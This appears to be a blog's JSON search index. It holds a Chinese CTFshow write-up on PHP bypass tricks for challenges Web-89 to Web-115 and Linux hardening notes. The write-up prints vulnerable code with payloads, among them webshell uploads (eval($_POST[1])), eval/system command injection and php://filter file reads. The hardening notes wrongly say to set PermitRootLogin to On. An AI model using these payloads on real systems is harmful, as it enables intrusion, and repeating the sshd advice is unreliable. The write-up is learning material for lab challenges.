{"meta":{"title":"4CH4N ZKUAN","subtitle":"-","description":"","author":"zkuan","url":"https://whoiszkuan.github.io","root":"/"},"pages":[{"title":"404","date":"2021-08-10T14:46:38.000Z","updated":"2021-08-10T14:47:46.367Z","comments":true,"path":"404/index.html","permalink":"https://whoiszkuan.github.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2021-08-10T14:37:27.000Z","updated":"2021-11-29T01:54:57.827Z","comments":true,"path":"about/index.html","permalink":"https://whoiszkuan.github.io/about/index.html","excerpt":"","text":"一名热爱网络安全的学生偶尔记记笔记技术很水"},{"title":"categories","date":"2021-08-10T15:08:53.000Z","updated":"2021-08-10T15:09:33.727Z","comments":true,"path":"categories/index.html","permalink":"https://whoiszkuan.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-08-10T15:21:00.000Z","updated":"2021-08-10T15:21:27.431Z","comments":true,"path":"tags/index.html","permalink":"https://whoiszkuan.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"PHP Security Features","slug":"PHP-Security-Features","date":"2021-12-02T13:11:17.000Z","updated":"2021-12-02T13:13:01.009Z","comments":true,"path":"2021/12/02/PHP-Security-Features/","link":"","permalink":"https://whoiszkuan.github.io/2021/12/02/PHP-Security-Features/","excerpt":"CTFshow:PHP特性学习","text":"Web-89 数组绕过include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if(preg_match(\"/[0-9]/\", $num)){ die(\"no no no!\"); } if(intval($num)){ echo $flag; } } preg_match正则匹配0-9通过数组绕过 payload：?num[]= Web-90 intvalinclude(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num===\"4476\"){ die(\"no no no!\"); } if(intval($num,0)===4476){ echo $flag; }else{ echo intval($num,0); } } intval函数说明intval-获取变量的整数值 intval (mixed $var [,int $base=10]) : int var 要转换成integer的数量值 base 转化所使用的进制 如果base是0，通过监测var的格式来决定使用的进制 如果字符串包括了”0x”或”0X”的前缀，使用16进制(hex) 如果字符串以”0”开始，使用8进制(octal)，否则将使用十进制。 通过使用指定的进制base转换（默认十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1. 综上所述，要构造一个不强等于4476，又要使intval函数处理后的结果强等于4476： ?num=0x117c or ?numb=4476a Web-91 %0a绕过show_source(__FILE__); include('flag.php'); $a=$_GET['cmd']; if(preg_match('/^php$/im', $a)){ if(preg_match('/^php$/i', $a)){ echo 'hacker'; } else{ echo $flag; } } else{ echo 'nonononono'; } 修饰符 含义 i ignore-不区分大小写 g global-全局匹配 m multi line-多行匹配 s 特殊字符圆点 . 中包含换行符 \\n 第一个if：匹配多行且不区分大小写，满足两个条件进入第二个判断 第二个if：区分大小写但只匹配单行，如果第一行不存在php则打印出flag。 综上所述：可使用换行符+字符串php，同时满足两个判断的条件，当第一个判断时，换行符+php为两行既多行，且能匹配到字符串php。进入第二个判断，第一行为换行符，即第一行为空不为php，所以输出flag payload:?cmd=%0aphp Web-92 intval 八进制十六进制绕过include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num==4476){ die(\"no no no!\"); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } intval函数，可使用八进制(010574)或十六进制(0x117c)绕过 Web-93 intval 八进制绕过include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num==4476){ die(\"no no no!\"); } if(preg_match(\"/[a-z]/i\", $num)){ die(\"no no no!\"); } if(intval($num,0)==4476){ echo $flag; }else{ echo intval($num,0); } } 正则表达式过滤了[a-z]字母，可使用intval八进制(010574)绕过 Web-94 intval 小数点绕过include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num===\"4476\"){ die(\"no no no!\"); } if(preg_match(\"/[a-z]/i\", $num)){ die(\"no no no!\"); } if(!strpos($num, \"0\")){ die(\"no no no!\"); } if(intval($num,0)===4476){ echo $flag; } } 比较上一关出现了strpos()函数，函数说明 查找关键字在字符串中第一次出现的位置 对大小写敏感 返回字符串在另一字符串中第一次出现的位置，如果没有字符串则返回FALSE。 !strpos($num, \"0\")限制了传参时第一位不能为0，如果第一位为0，则die，在字符串中找不到0，也会die。 payload可为： 空格+八进制： 010574 小数点+0：4476.0 头部加号+尾部小数点：+4476.0 Web-95 intval 空格绕过include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET['num'])){ $num = $_GET['num']; if($num==4476){ die(\"no no no!\"); } if(preg_match(\"/[a-z]|\\./i\", $num)){ die(\"no no no!!\"); } if(!strpos($num, \"0\")){ die(\"no no no!!!\"); } if(intval($num,0)===4476){ echo $flag; } } 过滤了小数点，可用空格+八进制绕过： 010574 也可用URL编码+八进制绕过：%20010574or%0a010574 Web-96 绝对路径，相对路径highlight_file(__FILE__); if(isset($_GET['u'])){ if($_GET['u']=='flag.php'){ die(\"no no no\"); }else{ highlight_file($_GET['u']); } } 不能直接读取flag.php， 绝对路径读取：/var/www/html/flag.php 相对路径读取：./flag.php 两者皆可读取flag Web-97 md5强比较include(\"flag.php\"); highlight_file(__FILE__); if (isset($_POST['a']) and isset($_POST['b'])) { if ($_POST['a'] != $_POST['b']) if (md5($_POST['a']) === md5($_POST['b'])) echo $flag; else print 'Wrong.'; } 强比较：如果传入md5函数的不是数值和字符串，而是对象，那么就会返回null，null===null为True，成功绕过 payload：a[]=1&amp;b[]=2 Web-98 三元运算include(\"flag.php\"); $_GET?$_GET=&amp;$_POST:'flag'; $_GET['flag']=='flag'?$_GET=&amp;$_COOKIE:'flag'; $_GET['flag']=='flag'?$_GET=&amp;$_SERVER:'flag'; highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__); $_GET?$_GET=&amp;$_POST:'flag';和$_GET['HTTP_FLAG']=='flag'是重点只需GET方式随便获取一个值，使POST赋值到GET，以POST方式传输HTTP_FLAG=flag即可 payload:GET:?a=a,POST:HTTP_FLAG=flag Web-99 in_array绕过highlight_file(__FILE__); $allow = array(); for ($i=36; $i &lt; 0x36d; $i++) { array_push($allow, rand(1,$i)); } if(isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)){ file_put_contents($_GET['n'], $_POST['content']); } in_arrayin_array — 检查数组中是否存在某个值 语法： in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool 在$haystack中寻找$needle，如果没有设置$strict，则为弱比较。 因此，$_GET['n']传入值为1.php时弱等于1. payload: GET:?n=1.php POST:content=&lt;?php eval($_POST[1]);?&gt; 然后打开1.php通过POST执行命令即可 Web-100 反射类及运算符优先级highlight_file(__FILE__); include(\"ctfshow.php\"); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET['v1']; $v2=$_GET['v2']; $v3=$_GET['v3']; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0){ if(!preg_match(\"/\\;/\", $v2)){ if(preg_match(\"/\\;/\", $v3)){ eval(\"$v2('ctfshow')$v3\"); } } } 考察点：and 和 &amp;&amp; 的优先级以及反射类ReflectionClass PHP运算符比较：&amp;&amp;&gt;||&gt;=&gt;and&gt;or $a=true and false and false; var_dump($a); //返回True $a=true &amp;&amp; false &amp;&amp; false; var_dump($a); //返回False 因此，$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);只需v1为数字即可进入if。 两个判断中，要求$v2不包含;$v3包含; 根据反射类文档，可构造出echo new ReflectionClass('ctfshow');获取flag 构造URL Payload：/?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; 非预期解payload v1=1&amp;v2=var_dump('ctfshow')/*&amp;v3=*/; v1=1&amp;v2=?&gt;&lt;?php echo 'ls'?&gt;/*&amp;v3=;*/ v1=1&amp;v2=-system('ls')-&amp;v3=-1; Web-101 反射类highlight_file(__FILE__); include(\"ctfshow.php\"); //flag in class ctfshow; $ctfshow = new ctfshow(); $v1=$_GET['v1']; $v2=$_GET['v2']; $v3=$_GET['v3']; $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0){ if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){ if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){ eval(\"$v2('ctfshow')$v3\"); } } } 与上一题相同，过滤更严格，直接通过反射类ReflectionClass获取Flag。 Web-102,103 hex2binhighlight_file(__FILE__); $v1 = $_POST['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; $v4 = is_numeric($v2) and is_numeric($v3); if($v4){ $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str); } else{ die('hacker'); } 本题知识点：hex2bin(),is_numeric(),call_user_func(),file_put_contents() hex2bin在PHP5中，hex2bin可将十六进制字符串转换为二进制字符串 本题中用于将木马编写为16进制字符串 is_numeric检测变量是否为数字或为数字字符串 在PHP5中，可识别十六进制字符串，可进行0x截断，经过截断后得到不带0x的16进制的木马文件 不过此环境是PHP7，不可以。 call_user_func把第一个参数作为回调函数调用，其余都是回调函数的参数 在本题中，通过substr($v2,2)截取从2开始以后的数值为$s，将$s作为$v1(hex2bin)的回调函数参数 file_put_contents将一个字符串写入文件 语法：file_put_contents($filename,$data); 本题中将$str中的内容写入$v3中 构造综上所述，要让$v2均为数字，$v3利用伪协议写入 padload: GET:?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php POST:v1=hex2bin $v2中的e为科学计数法，可以被is_numeric识别，带有其他字符不可以。 Web-104 sha1弱等于highlight_file(__FILE__); include(\"flag.php\"); if(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_POST['v1']; $v2 = $_GET['v2']; if(sha1($v1)==sha1($v2)){ echo $flag; } } 此题没有难度，sha1($v1)弱等于sha1($v2)，也就是说两个值经过sha1加密后传入URL即可。 sha1：计算字符串的sha1散列值，返回sha1散列值字符串。 payload: GET:?v2=40bd001563085fc35165329ea1ff5c5ecbdbbeef POST:v1=40bd001563085fc35165329ea1ff5c5ecbdbbeef 其他解法： sha1函数无法处理数组类型，报错返回false payload:GET:?v2[]=1andPOST:v1[]=2 Web-105 $$覆盖highlight_file(__FILE__); include('flag.php'); error_reporting(0); $error='你还想要flag嘛？'; $suces='既然你想要那给你吧！'; foreach($_GET as $key =&gt; $value){ if($key==='error'){ die(\"what are you doing?!\"); } $$key=$$value; }foreach($_POST as $key =&gt; $value){ if($value==='flag'){ die(\"what are you doing?!\"); } $$key=$$value; } if(!($_POST['flag']==$flag)){ die($error); } echo \"your are good\".$flag.\"\\n\"; die($suces); 本题考察点：变量覆盖 根据代码中三个if判断，GET中的值不能强等于error,POST中的值不能强等于flag且POST中的值需要弱等于flag否则die。 利用变量覆盖绕过 $suces = $flag $error = $suces $error的值随着$flag的值变化而变化，将$error=$flag利用POST传输可以绕过对于POST的过滤，而$suces=$flag利用GET方式进行传输可绕过对GET的过滤，满足条件，构造payload。 GET:?suces=flag POST:error=suces Web-106 sha1弱比较highlight_file(__FILE__); include(\"flag.php\"); if(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_POST['v1']; $v2 = $_GET['v2']; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2){ echo $flag; } } 与第104题相似，不过多了一个条件，$v1与$v2之间sha1密文可以相同，但字符串不能相同，不能使用104题的方法进行绕过。 可进行数组绕过： GET:?v2[]=1 POST:v1[]=2 如果强制类型转换，需要找sha1密文不同但解码出来的明文相同，以下： aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m Web-107 md5弱比较highlight_file(__FILE__); error_reporting(0); include(\"flag.php\"); if(isset($_POST['v1'])){ $v1 = $_POST['v1']; $v3 = $_GET['v3']; parse_str($v1,$v2); if($v2['flag']==md5($v3)){ echo $flag; } } parse_str函数将字符串解析成多个变量 语法: parse_str ( string $encoded_string [, array &amp;$result ] ) : void 如果设置了result变量，变量将会以数组的形式存入到这个数组作为替代。 根据题意，判断为md5的弱比较，需要使$v2['flag']==md5($v3)两边同时为FALSE或TRUE， 构造payload： GET: ?v3[]=1 POST: v1= 满足两边同时为NULL，NULL==NULL为TRUE，因此成立 or GET: ?v3=1 POST: v1=flag=c4ca4238a0b923820dcc509a6f75849b v1中的值为md5，两边弱比较为TRUE 或者使用0e开头的md5，采用00截断的方法绕过 0e开头的md5和原值： QNKCDZO 0e830400451993494058024219903391 240610708 0e462097431906509019562988736854 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 Web-108 ereg %00截断highlight_file(__FILE__); error_reporting(0); include(\"flag.php\"); if (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE) { die('error'); } //只有36d的人才能看到flag if(intval(strrev($_GET['c']))==0x36d){ echo $flag; } ereg正则表达式匹配。如今已被preg_match()函数替代。 ereg()用指定的模式搜索一个字符串中指定的字符串，如果匹配成功返回true，反之返回false。搜索的字符是大小写敏感的。ereg()存在NULL截断漏洞，导致正则过滤被绕过，可以使用%00截断正则匹配 strrev反转字符串 intval获取变量的整数值。通过指定的进制base转换(默认十进制) 已知：通过正则表达式ereg字符串中需要包含字母通过if判断，且将字符串倒转以后$_GET['c']与0x36d弱相等。887为0x36d的10进制 综上所述，构造出payload a%00778 由于ereg的漏洞，正则表达式只会匹配到%00之前的字符，后面的已经被截断，通过验证之后，将payload倒转成877%00a再用intval函数获取整数部分887。 Web-109 反射类，异常类highlight_file(__FILE__); error_reporting(0); if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/[a-zA-Z]+/', $v1) &amp;&amp; preg_match('/[a-zA-Z]+/', $v2)){ eval(\"echo new $v1($v2());\"); } } 考察点：PHP反射类、异常类 从preg_match正则表达式中可知匹配至少有一个字母的字符串。因此只要new后面有个类不报错就可以随意构造，并且可以直接执行系统命令。 反射类:ReflectionClass 异常类:Exception payload: ?v1=Exception;system(‘tac fl36dg.txt’);//&amp;v2=a ?v1=Exception&amp;v2=system(‘tac fl36dg.txt’) ?v1=RefletionClass&amp;v2=system(‘tac fl36dg.txt’) Web-110 FilesystemIterator类highlight_file(__FILE__); error_reporting(0); if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){ die(\"error v1\"); } if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){ die(\"error v2\"); } eval(\"echo new $v1($v2());\"); } 正则表达式过滤除字母外的所有字符，通过FilesystemIterator内置类绕过读取当前目录下的文件。PHP中的getcwd()可以做到 payload:?v1=FilesystemIterator&amp;v2=getcwd 读取到当前目录存在fl36dga.txt,浏览器直接访问得到flag。 Web-111 GLOBALS全局变量include(\"flag.php\"); function getFlag(&amp;$v1,&amp;$v2){ eval(\"$$v1 = &amp;$$v2;\"); var_dump($$v1); } if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/', $v1)){ die(\"error v1\"); } if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/', $v2)){ die(\"error v2\"); } if(preg_match('/ctfshow/', $v1)){ getFlag($v1,$v2); } } php变量地址引用。利用全局变量赋值给ctfshow这个变量。 payload:?v1=ctfshow&amp;v2=GLOBALS Web-112 is_file绕过,php伪协议function filter($file){ if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){ die(\"hacker!\"); }else{ return $file; } } $file=$_GET['file']; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } is_file()is_file函数。判断给定文件名是否为一个正常的文件。 如果文件存在且为正常的文件则返回TRUE，否则返回FALSE。 审计代码后发现，如果文件名不为正常的文件，则高亮显示flag。 因此需要做到高亮显示flag文件但文件必须存在。 使用PHP伪协议进行绕过 实验：1. 当文件存在当前目录时，返回TRUE 2. 当文件存在当前目录，使用PHP伪协议时，返回FALSE 绕过条件 payload: ?file:php://filter/resource=flag.php ?file:php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php ?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php ?file=compress.zlib://flag.php 关于过滤器php://的参考文档：https://www.php.net/manual/zh/wrappers.php.php php://filter/实战技巧：https://www.anquanke.com/post/id/202510 Web-113 目录溢出function filter($file){ if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){ die('hacker!'); }else{ return $file; } } $file=$_GET['file']; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } 预期解： ?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php 在Linux中/proc/self/root指向根目录，也就是说如果在命令行中输入ls /proc/self/root其实显示的是根目录下的内容，多次重复后可以绕过is_file 非预期解： 利用没有被过滤的伪协议读文件： ?file=compress.zlib://flag.php Web-114 filterfunction filter($file){ if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){ die('hacker!'); }else{ return $file; } } $file=$_GET['file']; echo \"师傅们居然tql都是非预期 哼！\"; if(! is_file($file)){ highlight_file(filter($file)); }else{ echo \"hacker!\"; } 师傅们居然tql都是非预期 哼！ 过滤中没有php和filter。 payload:?file=php://filter/resource=flag.php Web-115 trim绕过include('flag.php'); highlight_file(__FILE__); error_reporting(0); function filter($num){ $num=str_replace(\"0x\",\"1\",$num); $num=str_replace(\"0\",\"1\",$num); $num=str_replace(\".\",\"1\",$num); $num=str_replace(\"e\",\"1\",$num); $num=str_replace(\"+\",\"1\",$num); return $num; } $num=$_GET['num']; if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){ if($num=='36'){ echo $flag; }else{ echo \"hacker!!\"; } }else{ echo \"hacker!!!\"; } trim去除字符串首尾处的空白字符（或者其他字符） 语法： trim(string,charlist) 描述： string 必需。规定要检查的字符串 charlist 可选。规定从字符串中删除哪些字符。如果省略该函数，则移除下列所有字符。 “\\0” - NULL “\\t” - 制表符 “\\n” - 换行符 “\\x0B” - 垂直制表符 “\\r” - 回车 “ “ - 空格 测试 输出%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9 输出 %0C %2B - . 0 1 2 3 4 5 6 7 8 9 因为%2B - . 被过滤 在数字前加空格也会被is_numeric识别为数字，trim过滤空格不会过滤\\f(%0c) payload:?num=%0c36","categories":[{"name":"WebSec","slug":"WebSec","permalink":"https://whoiszkuan.github.io/categories/WebSec/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"},{"name":"Web","slug":"Web","permalink":"https://whoiszkuan.github.io/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://whoiszkuan.github.io/tags/PHP/"}]},{"title":"Linux-Security","slug":"Linux-Security","date":"2021-11-04T12:58:18.000Z","updated":"2021-12-02T13:07:22.845Z","comments":true,"path":"2021/11/04/Linux-Security/","link":"","permalink":"https://whoiszkuan.github.io/2021/11/04/Linux-Security/","excerpt":"Linux security Prerequisites","text":"Linux系统安全账户安全用户类型 超级用户 用户名为root或者UID为0的用户，可以修改所有系统文件 系统用户 Linux系统所需的內建用户，不能登录，如bin、adm、lp等 普通用户 一般使用的用户都为普通用户 用户信息存储 用户信息文件 /etc/passwd /etc/shadow 组信息文件 /etc/group /etc/gshadow 正常登录流程： 用户登录–&gt;是否有该用户–&gt;确认用户的UID–&gt;核实shadow文件的密码–&gt;成功登录 /etc/passwd系统识别用户的文件，所有的用户信息都在文件中记录 zkuan:x:500:500:zkuan sun:/home/zkuan:/bin/bash 用户名（也被成为登录名） 口令；在例子中我们看到的是x，其实密码已经被映射到/etc/shadow文件中 UID；用户ID GID；用户组ID 用户名全称，可选 用户的家目录所在位置 用户所用shell的类型 /etc/shadowzkuan:$y$j9T$NRRMLswRhLY1$/k2zkdTk.deUPg2sx7.11WXPPXK67:18840:0:99999:7::: passwd的影子文件，两文件互补 用户名 密码（被加密） 上次修改口令的时间 两次修改口令的间隔 两次修改口令间隔最少的天数 两次修改口令间隔最多的天数 在口令过期之后多少天禁用次用户 用户过期日期 保留字段，目前为空 /etc/group具有共同特性的用户集合起来就是用户组 root:x:0:root,linux 用户组名称 用户组密码 GID 用户列表，每个用户之间用,号分割 /etc/gshadow/etc/group的加密文件 groupname:x:admin:admin 用户组 用户组密码 用户组管理者 用户组成员 用户认证方式用户名+密码（SSH、Telnet、FTP） 包含数字、字母、下划线 容易暴力破解、密码丢失 基于证书（秘钥） 公钥保存在远程服务器，专用秘钥保存在本地 通过本地秘钥与服务器公钥进行配对认证登录 避免暴力破解 PAM（Pluggable Authentication Modules） 适用于本地登录与远程登录的机制 很大灵活性，通过配置文件可设置多重认证方式，不同登录方式及不同策略 安全性较强 用户访问文件权限分配drwxr-xr-x 3 zkuan zkuan 4096 8月 1 23:11 .vscode d:文件类型：d为文件夹，-为文件 rwx:文件拥有者的权限（User） r-x:文件拥有者所在组其他用户的权限（Group） r-x:系统中其他用户权限（Other） 2:链接数 zkuan:文件拥有者UID zkuan:文件拥有者GID 4096:文件大小 8月 1 23:11:最后修改时间 .vscode:文件名 权限表示方式r–&gt;读(4)、w–&gt;写(2)、x–&gt;执行(1) chmod命令给文件设置权限： chmod 777 config chmod u=rwx config -rw——-(600) 只有拥有者有读、写权限 -rw-r–r–(644) 只有拥有者有读、写权限；而组用户和其他用户只有读权限 -rwx——(700) 只有拥有者有读、写、执行权限 -rwxr-xr-x(755) 拥有者读、写、执行；组用户和其他用户只有读、执行权限 -rwx–x–x(711) 拥有者读、写、执行；组用户和其他用户只有执行权限 -rw-rw-rw-(666) 所有用户都有读、写权限 -rwxrwxrwx(777) 所有用户都有读、写、执行权限 特殊权限SUID全称Set User ID,当小写字母s出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得文件拥有者的权限 -rwsr-xr-x 1 root root 63960 2月 7 2020 /usr/bin/passwd 文件拥有者的执行位上出现为s为不是x，所以说passwd这个程序具有SUID权限，因此在修改用户密码时用的就是sudo passwd xxx命令。 如果在浏览文件时，发现文件所有者权限的第三位为大写S则表明该文件SUID无效 SUID权限机制： 使用SUID需要满足： SUID只对二进制文件有效，不能作用于目录或者脚本 调用者对该文件有执行权 在执行过程中调用者会暂时获得该文件的所有者权限 权限只在程序执行的过程中有效 SGID全称Set Group ID,当小写字母s出现在文件用户组权限位上时，对普通二进制文件和目录都有效。作用于普通文件时，和SUID类似，用户将获得该文件所属组的权限；作用于目录时，当用户对某一目录有写和执行的权，可在该目录下建立文件，而该用户在这个目录建立的文件都属于这个目录的所属组 SBIT全称Sticky Bit(粘滞位),小写字母t出现在其他用户权限的执行位上。当目录拥有SBIT权限时，该用户在这个目录下所建立的文件只有该用户和root用户可以删除。 drwxrwxrwt 26 root root 12288 11月 4 20:41 /tmp 如果目录的其他用户权限执行位是大写T，则SBIT权限无效。 三种特殊权限的设置三个权限的对应数字为：SUID(4),SGID(2),SBIT(1) 假设要设置文件夹权限为-rwsr-xr-x,由于s在所有者权限的执行位上，s为SUID，因此原先的755要在前面加上4，用chmod 4755 config赋予 符号法设置特殊权限 权限中的ugoa代表的是： u=user g=group o=other a=all 给所有人添加执行权限：chmod a+x config 给所有者全部权限，所属组读写，其他人读权限：chmod u=rwx,g=rw,o=r config 清除各种身份权限：chmod a=- config 账户风险和安全策略特权用户排查awk -F: '$3==0 {print $1}' /etc/passwd $3=0:取/etc/passwd中第三位值为0的用户 print $1:如果第三位值为0，便打印出第一位（用户名称） 排查UID为0的用户，一般只有root用户UID为0 账号密码生命周期对于采用静态口令认证的服务器，账户密码生命周期应小于90，且拒绝弱口令以及空口令 使用more /etc/login.defs检查相关参数 PASS_MIN_LEN:设置密码最短长度 密码强度如果只使用PASS_MIN_LEN设置密码长度并不严谨，因为纯字母或纯数字也可以登录，为了保障用户密码强度，静态口令认证长度至少8位，并包括数字、小写字母、大写字母、特殊符号4类中至少2类 /etc/pam.d/system-authpassword requisite pam_cracklib.so difok=3 minlen=8 ucredit=-1 lcredit=-1 dcredit=-1 新密码与旧密码不同的个数为3，至少8位，包含一位大写字母、一位小写字母、一位数字。 用户锁定配置用户连续认证失败次数超过10次，锁定用户账号。 /etc/pam.d/system-authauth required pam_tally.so onerr=fail deny=10 unlock_time=300 密码连续错误10次，账号锁定300秒（5分钟） 解锁用户faillog -u (username) -r 访问权限控制umask安全配置/etc/login.defs umask的作用：默认情况下umask值为022（可用umask命令查看） 此时建立的文件默认权限是644(6-0,6-2,6-2)，建立文件夹默认权限是755(7-0,7-2,7-2) 022表示默认创建文件夹权限为755 027表示默认创建文件夹权限为750 重要目录权限对于重要目录，建议执行以下操作 chmod -R 750 /etc/rc.d/init.d/* 只有root可以读写执行这个目录下的脚本 安全审计查看未授权的SUID/SGID SUID/SGID程序在运行时，将有效用户ID改变为该程序所有者(组)ID。因而可能存在一定的安全隐患，经常性的对比SUID/SGID文件列表，以便能够及时发现可以后门程序 找出文件中所有含s位的程序，把不必要的s位去掉，或者把根本不用的直接删除，这样可以防止用户滥用及提升权限的可能性 查找SUID可执行程序 find / -type f -perm -4000 -ls 查找SGID可执行程序 find / -type f -perm -2000 -ls 查找SUID/SGID/或者两个都有 find / -type f -perm -6000 -ls find:查找命令 /:指定路径，根目录 -type:指定类型 f:文件类型 -perm:指定权限 -4000:权限 -ls:列出目录 -4000:至少满足4000权限 syslog登录事件记录/etc/rsyslog.conf history时间戳当遭受黑客入侵后，需要查看history命令记录，查看是否有删除或移动文件、修改配置等操作，配置history时间戳，便于分析、定位问题 /etc/profile export HISTTIMEFORMAT= \"%F %T 'whoami'\" 资源控制登录超时/etc/profile 添加”TMOUT=”行开头的注释 限制登录 禁止root远程登录 /etc/ssh/sshd_config 确保PERMITROOTLOGIN为On 限定信任主机 /etc/hosts.equiv /$HOME/.RHOSTS 查看上述两个文件中的主机，删除其中不必要的主机，防止存在多余的信任主机 或直接关闭所有R系列远程服务 RLOGIN RSH REXEC 禁用Telnet，使用SSH进行管理 开启SSH服务：systemctl start sshd 限制能够登录本机的IP地址 /etc/ssh/sshd_config ALLOWUSERS zkuan@10.0.0.123 允许zkuan通过地址10.0.0.123登录本机 ALLOWUSERS *@10.0.*.* 仅允许10.0.0.0/16网段的所有用户登录 修改SSH配置 修改端口Port:/etc/ssh/sshd_config 修改banner信息 修改sshd_config /etc/ssh/sshd_config 如存在，则将banner字段设置为NONE 修改motd /etc/motd 查看该文件内容，更新成自己想要添加的内容 入侵防范 使用防火墙 包过滤 NAT 数据包处理 语法 iptables [-t table] command [match][target] 应用 iptables -I input -s 192.168.1.0/24 -p tcp –dport 22 -j ACCEPT 只允许本机22端口被192.168.1.0/24访问 